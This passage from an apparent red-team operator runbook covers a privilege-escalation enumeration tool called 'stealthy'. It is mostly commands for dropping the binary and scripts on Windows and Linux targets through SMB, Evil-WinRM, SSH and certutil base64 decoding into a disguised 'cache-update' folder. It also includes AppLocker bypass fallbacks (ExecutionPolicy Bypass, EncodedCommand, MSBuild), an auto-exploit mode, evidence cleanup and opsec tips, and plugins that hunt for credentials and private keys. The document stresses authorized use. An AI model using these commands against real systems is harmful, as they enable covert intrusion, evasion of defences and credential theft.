Remove-Item -Force -ErrorAction SilentlyContinue C:\Users\Public\Documents\cache-update\stealthy.exe
```

Document service creation/deletion timestamps in the engagement log — defenders will see them either way.

### 4.7 Linux-operator Windows tooling (Impacket / Evil-WinRM)

Impacket smbclient-style upload:

```bash
# example tooling name — use your approved package path
smbclient.py 'DOMAIN/user:PASSWORD@TARGET' <<'EOF'
use C$
mkdir Users\Public\Documents\cache-update
put target/x86_64-pc-windows-gnu/release/stealthy.exe Users\Public\Documents\cache-update\stealthy.exe
put scripts/windows/enum.ps1 Users\Public\Documents\cache-update\enum.ps1
ls Users\Public\Documents\cache-update
exit
EOF
```

Evil-WinRM:

```bash
evil-winrm -i TARGET -u user -p 'PASSWORD'
# inside the shell:
# upload target/x86_64-pc-windows-gnu/release/stealthy.exe C:\Users\Public\Documents\cache-update\stealthy.exe
# upload scripts/windows/enum.ps1 C:\Users\Public\Documents\cache-update\enum.ps1
```

For PsExec-like remote create from Impacket, use section **4.6.4**.

### 4.8 Base64 / certutil / PowerShell decode

Build host:

```bash
base64 -w0 target/x86_64-pc-windows-gnu/release/stealthy.exe > /tmp/stealthy.exe.b64
split -b 500k /tmp/stealthy.exe.b64 /tmp/stealthy.exe.b64.part.
```

Transfer the `.b64` (or parts) as text, then on Windows:

```cmd
certutil -decode C:\Users\Public\Documents\stealthy.exe.b64 C:\Users\Public\Documents\cache-update\stealthy.exe
C:\Users\Public\Documents\cache-update\stealthy.exe --help
```

PowerShell reassembling parts + decode:

```powershell
$Dir = 'C:\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Get-Content .\stealthy.exe.b64.part.* | Set-Content -Encoding ascii .\stealthy.exe.b64
$bytes = [Convert]::FromBase64String((Get-Content -Raw .\stealthy.exe.b64))
[IO.File]::WriteAllBytes("$Dir\stealthy.exe", $bytes)
Get-FileHash "$Dir\stealthy.exe" -Algorithm SHA256
```

### 4.9 FTP / WebDAV (only if already approved infrastructure)

```powershell
# FTP example using curl.exe
curl.exe -u user:pass ftp://FILES/stealthy.exe -o "$Dir\stealthy.exe"

# WebDAV mapped folder then copy
net use W: https://files.example/dav /user:user *
copy /Y W:\engagement\stealthy.exe C:\Users\Public\Documents\cache-update\stealthy.exe
```

### 4.10 Script-only deploy (custom `.exe` blocked)

Drop scripts without the PE:

```powershell
$Dir = 'C:\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
# After copying enum.ps1 / enum.js / EnumTasks.csproj into $Dir:
powershell -NoProfile -ExecutionPolicy Bypass -File "$Dir\enum.ps1"
cscript //nologo "$Dir\enum.js"
```

From operator host over SSH:

```bash
ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path '$REMOTE_DIR_WIN' | Out-Null\""
scp scripts/windows/enum.ps1 scripts/windows/enum.js scripts/windows/EnumTasks.csproj \
  "$TARGET:$REMOTE_DIR/"
ssh "$TARGET" 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\Documents\cache-update\enum.ps1'
ssh "$TARGET" 'cscript //nologo C:\Users\Public\Documents\cache-update\enum.js'
```

WinRM script push without writing `enum.ps1` first:

```powershell
$S = New-PSSession -ComputerName TARGET -Credential (Get-Credential)
Invoke-Command -Session $S -FilePath .\scripts\windows\enum.ps1
Remove-PSSession $S
```

Encoded command for tiny checks (prefer files for the full script; keep encoding for last-resort):

```powershell
$cmd = Get-Content -Raw .\scripts\windows\enum.ps1
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -NoProfile -EncodedCommand $b64
```

MSBuild stub (allowlisted toolchain path; documentation/host helper only):

```cmd
where msbuild
msbuild C:\Users\Public\Documents\cache-update\EnumTasks.csproj
```

If AppLocker blocks `powershell.exe` but allows `cscript.exe`, use `enum.js`. If both are blocked, stop and escalate within ROE — do not invent unsigned loaders.

### 4.11 Post-deploy verify (Windows)

```powershell
$Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
Get-Item $Bin | Format-List FullName, Length, LastWriteTime
Get-FileHash $Bin -Algorithm SHA256
& $Bin --help
& $Bin disclaimer
```

From Linux operator after SCP:

```bash
ssh "$TARGET" 'powershell -NoProfile -Command "Get-FileHash C:\Users\Public\Documents\cache-update\stealthy.exe -Algorithm SHA256"'
sha256sum "$WIN_EXE_LOCAL"
```

SmartScreen / AppLocker quick triage:

```powershell
# If execution is blocked, capture the message and switch to 4.10 script-only
& $Bin --help
if (-not $?) { Write-Host 'PE blocked — use enum.ps1 / enum.js' }
```

---

## 5. Run on a Windows target

### 5.1 cmd.exe

```cmd
set BIN=C:\Users\Public\Documents\cache-update\stealthy.exe
set STEALTHY_AUTHORIZED=1
"%BIN%" disclaimer
"%BIN%" list-plugins
"%BIN%" enum
```

Explicit flag form:

```cmd
C:\Users\Public\Documents\cache-update\stealthy.exe --i-understand-authorized-use-only enum
```

### 5.2 PowerShell

```powershell
$Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
$env:STEALTHY_AUTHORIZED = '1'
& $Bin disclaimer
& $Bin list-plugins
& $Bin enum
& $Bin -q enum --plugins windows.privileges,windows.services,windows.always_install_elevated
```

### 5.3 Sealed / plaintext output

```powershell
$Bin = 'C:\Users\Public\Documents\cache-update\stealthy.exe'
$env:STEALTHY_AUTHORIZED = '1'
& $Bin --output file --output-path 'C:\Users\Public\Documents\cache-update\findings.seal' enum
& $Bin --output file --output-path 'C:\Users\Public\Documents\cache-update\findings.json' --plaintext-file enum
```

### 5.4 Limited auto-exploit

```powershell
$env:STEALTHY_AUTHORIZED = '1'
& $Bin enum --auto-exploit
```

### 5.5 Script fallbacks

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File .\enum.ps1 | Tee-Object -FilePath .\enum-ps.txt
cscript //nologo .\enum.js > .\enum-js.txt
```

### 5.6 Windows cleanup

```powershell
$Dir = 'C:\Users\Public\Documents\cache-update'
Remove-Item -Force -ErrorAction SilentlyContinue @(
  "$Dir\stealthy.exe",
  "$Dir\findings.seal",
  "$Dir\findings.json",
  "$Dir\enum.ps1",
  "$Dir\enum.js",
  "$Dir\EnumTasks.csproj"
)
Remove-Item -Recurse -Force -ErrorAction SilentlyContinue $Dir
```

```cmd
del /f /q C:\Users\Public\Documents\cache-update\stealthy.exe
del /f /q C:\Users\Public\Documents\cache-update\findings.*
rmdir /s /q C:\Users\Public\Documents\cache-update
```

---

## 6. Common operator recipes

### 6.1 Linux: build, push, enum, pull sealed results

```bash
set -euo pipefail
TARGET='user@10.0.0.20'
REMOTE='/tmp/.cache-update'
cargo build -p stealthy --release
ssh "$TARGET" "mkdir -p $REMOTE"
scp target/release/stealthy "$TARGET:$REMOTE/stealthy"
ssh "$TARGET" "chmod +x $REMOTE/stealthy && STEALTHY_AUTHORIZED=1 $REMOTE/stealthy --output file --output-path $REMOTE/findings.seal -q enum"
scp "$TARGET:$REMOTE/findings.seal" ./findings-$(date +%Y%m%d%H%M%S).seal
ssh "$TARGET" "rm -f $REMOTE/stealthy $REMOTE/findings.seal"
```

### 6.2 Windows: cross-build, SCP, enum, pull sealed results

```bash
set -euo pipefail
TARGET='user@10.0.0.30'
REMOTE='C:/Users/Public/Documents/cache-update'
rustup target add x86_64-pc-windows-gnu
cargo build -p stealthy --release --target x86_64-pc-windows-gnu
ssh "$TARGET" "powershell -NoProfile -Command \"New-Item -ItemType Directory -Force -Path 'C:\\Users\\Public\\Documents\\cache-update' | Out-Null\""
scp target/x86_64-pc-windows-gnu/release/stealthy.exe "$TARGET:$REMOTE/stealthy.exe"
ssh "$TARGET" 'set STEALTHY_AUTHORIZED=1&& C:\Users\Public\Documents\cache-update\stealthy.exe --output file --output-path C:\Users\Public\Documents\cache-update\findings.seal -q enum'
scp "$TARGET:$REMOTE/findings.seal" ./findings-win-$(date +%Y%m%d%H%M%S).seal
ssh "$TARGET" 'del /f /q C:\Users\Public\Documents\cache-update\stealthy.exe C:\Users\Public\Documents\cache-update\findings.seal'
```

### 6.3 Linux script-only one-shot over SSH

```bash
TARGET='user@10.0.0.20'
ssh "$TARGET" 'bash -s' < scripts/linux/enum.sh | tee "linux-enum-$(date +%Y%m%d%H%M%S).txt"
```

### 6.4 Windows script-only one-shot over SSH

```bash
TARGET='user@10.0.0.30'
ssh "$TARGET" 'powershell -NoProfile -ExecutionPolicy Bypass -Command -' < scripts/windows/enum.ps1 \
  | tee "win-enum-$(date +%Y%m%d%H%M%S).txt"
```

### 6.5 Verify binary before use

```bash
# Linux
sha256sum target/release/stealthy
file target/release/stealthy
./target/release/stealthy --version

# Windows artifact from Linux cross build
sha256sum target/x86_64-pc-windows-gnu/release/stealthy.exe
file target/x86_64-pc-windows-gnu/release/stealthy.exe
```

```powershell
Get-FileHash .\target\release\stealthy.exe -Algorithm SHA256
(Get-Item .\target\release\stealthy.exe).VersionInfo
.\target\release\stealthy.exe --version
```

---

## 7. Plugin cheat sheet

### Linux (`list-plugins` on a Linux build)

| ID | Focus |
| --- | --- |
| `linux.sudo` | sudoers / NOPASSWD / version CVE hints |
| `linux.suid` | SUID/SGID / capabilities |
| `linux.systemd_cron` | Writable units / cron / timers |
| `linux.containers` | docker/podman/containerd/LXD sockets + groups |
| `linux.groups` | docker/lxd/disk and other root-adjacent groups |
| `linux.polkit` | pkexec + writable polkit rules |
| `linux.mounts` | mountinfo hints + writable `/etc/passwd` |
| `linux.ssh_keys` | Readable private keys / weak authorized_keys |
| `linux.path_ld` | Writable PATH / LD_* |
| `linux.kernel_cve` | Kernel version hints (no exploit) |
| `linux.nfs` | exports / NFS mounts |
| `linux.credentials` | shadow / backup / home creds |
| `linux.services` | Writable service configs |
| `linux.wildcard_cron` | Wildcard injection hints |

### Windows (`list-plugins` on a Windows build)

| ID | Focus |
| --- | --- |
| `windows.privileges` | Token privileges + Potato-family recommendation |
| `windows.services` | Unquoted / writable services + parent plant dirs |
| `windows.scheduled_tasks` | Task XML + writable action binaries |
| `windows.always_install_elevated` | Installer policy |
| `windows.uac` | UAC policy values |
| `windows.dll_hijack` | Search-path writability |
| `windows.credentials` | Unattend / SAM backups / user cred paths |
| `windows.admin_sessions` | Admins (NetAPI) / session hints |
| `windows.env_path` | PATH hijack candidates |
| `windows.autoruns` | Run keys / Startup folders |

Remember: Linux builds do not contain Windows plugins and vice versa.

---

## 8. Exit codes and failure triage

| Code / symptom | Meaning | What to do |
| --- | --- | --- |
| `2` + auth error text | Missing authorization ack | Pass `--i-understand-authorized-use-only` or set `STEALTHY_AUTHORIZED=1` |
| `0` with few findings | Healthy quiet host or filtered plugins | Widen `--plugins` or remove `--skip` |
| `permission denied` running binary | No execute bit / mount `noexec` | `chmod +x` or run from executable mount; else use scripts |
| Windows SmartScreen / AppLocker block | Custom `.exe` blocked | Use `enum.ps1` / `enum.js` / approved LOLBIN host |
| `sudo -l` noisy / audited | Expected | Prefer readable sudoers paths; avoid verbose unless needed |
| Sealed file present, lost key | Cannot decrypt | Re-run with key capture; treat as sensitive credential |

---

## 9. Opsec defaults (recommended)

1. Start with `-q enum` and memory output.
2. Keep `--delay-ms` at default (`50`) or higher on monitored hosts.
3. Avoid `--auto-exploit` until findings justify a reversible probe.
4. Prefer sealed `--output file` over `--plaintext-file`.
5. Delete drop paths when the check-in ends.
6. Do not open outbound exfil unless the C2 URL is explicitly in ROE.
7. Document every write probe and file drop in the engagement log.

---

## 10. Safety boundary (non-negotiable)

- Authorized assessments only
- Default = enumeration + recommendations
- `--auto-exploit` never runs kernel LPE in this build
- No silent network client in v1 remote mode
- Script fallbacks also enumeration-only

If ROE and this runbook conflict, **ROE wins** — reduce scope, do not improvise noisier techniques.
